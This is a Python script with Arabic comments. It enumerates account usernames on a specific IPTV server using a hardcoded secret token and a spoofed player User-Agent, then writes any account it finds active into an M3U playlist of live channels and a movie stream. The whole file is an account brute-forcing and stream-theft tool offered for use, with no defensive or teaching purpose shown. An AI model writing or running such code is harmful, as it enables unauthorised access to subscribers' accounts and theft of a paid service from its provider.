import requests

# إعدادات السيرفر والمعلومات الثابتة
SERVER = "http://vipwettbornwet.top:8080"
TOKEN_SECRET = "1260f37e4c58"
CHANNELS = ["37642", "37643", "37644"] # القنوات الأفغانية المباشرة

# إعداد الهيدر لتبدو كأنك مشغل IPTV حقيقي
HEADERS = {
    'User-Agent': 'IPTVSmartersPlayer',
    'Accept': '*/*'
}

def check_account(user):
    url = f"{SERVER}/{user}/{TOKEN_SECRET}/{CHANNELS[0]}"
    try:
        response = requests.head(url, headers=HEADERS, timeout=3, allow_redirects=True)
        if response.status_code == 200:
            return True
    except:
        pass
    return False

def get_movie_stream(user, movie_id):
    """جلب رابط الفيلم بناءً على الـ ID المستخرج من اللوغات"""
    # نستخدم نفس منطق الـ API اللي استخرجته أنت
    api_url = f"{SERVER}/api/android/transcoddedFiles/id/{movie_id}?username={user}&password={TOKEN_SECRET}"
    try:
        res = requests.get(api_url, headers=HEADERS, timeout=5).json()
        # نأخذ رابط الـ m3u8 المباشر
        return res[0]['videoUrl']
    except:
        return f"{SERVER}/movie/{user}/{TOKEN_SECRET}/{movie_id}.mp4" # رابط احتياطي

def update_m3u_file(working_user):
    # نستخدم معلومات من قائمة الـ JSON اللي استخرجتها
    movie_id = "139960" # ID فيلم Dakota
    movie_name = "Dakota (2022)"
    movie_logo = "https://image.tmdb.org/t/p/w600_and_h900_bestv2/j3eUOPUoDwkupwTPTDk6ESqrzGt.jpg"
    
    with open("playlist.m3u", "w", encoding="utf-8") as f:
        f.write("#EXTM3U\n")
        
        # إضافة القنوات (Live) تبقى كما هي
        f.write("\n#--- LIVE TV ---\n")
        for ch in CHANNELS:
            f.write(f'#EXTINF:-1 tvg-id="AFG_{ch}" group-title="AFGHAN LIVE", AFG CHANNEL {ch}\n')
            f.write(f"{SERVER}/{working_user}/{TOKEN_SECRET}/{ch}.ts\n")
            
        # إضافة الفيلم بالـ ID الحقيقي والامتداد mkv
        f.write("\n#--- SERVER MOVIES ---\n")
        f.write(f'#EXTINF:-1 tvg-id="" tvg-name="{movie_name}" tvg-logo="{movie_logo}" group-title="MOVIES | Action",{movie_name}\n')
        f.write(f"{SERVER}/movie/{working_user}/{TOKEN_SECRET}/{movie_id}.mkv\n")

    print(f"✅ تم التحديث بنجاح باستخدام الفيلم الحقيقي: {movie_name}")
def start_fuzzing():
    print("🚀 جاري بدء عملية الفحص وتخمين الحسابات...")
    for i in range(100, 999):
        target_user = f"VIP016471744476160{i}"
        print(f"🔎 فحص الحساب: {target_user}", end="\r")
        
        if check_account(target_user):
            print(f"\n✨ وجدته! حساب فعال: {target_user}")
            update_m3u_file(target_user)
            return 
            
    print("\n❌ لم يتم العثور على حساب فعال.")

if __name__ == "__main__":
    start_fuzzing()
